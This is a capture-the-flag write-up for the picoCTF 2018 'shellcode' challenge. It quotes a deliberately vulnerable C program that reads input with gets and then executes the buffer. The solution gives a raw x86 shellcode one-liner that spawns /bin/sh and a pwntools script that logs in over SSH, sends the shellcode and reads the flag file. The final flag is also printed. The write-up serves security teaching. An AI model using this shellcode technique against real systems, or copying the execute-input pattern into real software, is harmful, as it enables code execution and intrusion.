# shellcode
**Points: 200**

## Binary Exploitation

## Question
>This program executes any input you give it. Can you get a shell? You can find the program in /problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed on the shell server. Source.

### Hint
>Maybe try writing some shellcode?
>You also might be able to find some good shellcode online

## Solution

Let's check the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter a string!");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();
     
  return 0;
}
```

In the buf variable we have to input a shellcode: `((void (*)())buf)();`
```bash
(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"';cat ) | ./vuln
```

```python
#!/usr/bin/python3

from pwn import *
from getpass import getpass

shellcode = asm(shellcraft.sh())
path = '/problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed/'

s = ssh(host='2018shell4.picoctf.com',user=input('[+] SSH username: '),password=getpass('[+] SSH password: '))
r = s.run(path + 'vuln')

r.recvuntil('Enter a string!\n')
r.sendline(shellcode)
r.sendline('cat ' + path + 'flag.txt')
r.interactive()
s.close()
```

![alt text](https://github.com/manulqwerty/picoCTF-2018-WriteUp/blob/master/Binary%20Exploitation/shellcode/images/1.png)

### Flag
`picoCTF{shellc0de_w00h00_9ee0edd0}`
